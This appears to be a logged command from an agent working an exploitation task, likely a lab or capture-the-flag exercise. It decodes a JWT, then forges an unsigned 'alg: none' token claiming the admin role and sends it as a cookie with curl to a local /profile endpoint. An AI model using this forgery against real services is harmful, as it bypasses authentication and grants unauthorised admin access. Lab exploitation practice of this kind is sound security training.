input.command: echo 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0' | base64 -d 2>/dev/null; echo; echo 'eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9' | base64 -d 2>/dev/null; echo

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='); PAYLOAD=$(echo -n '{"username":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='); TOKEN="$HEADER.$PAYLOAD."; echo $TOKEN; curl -s -i -b "token=$TOKEN" http://localhost:45601/profile
input.description: Forge admin JWT and access profile
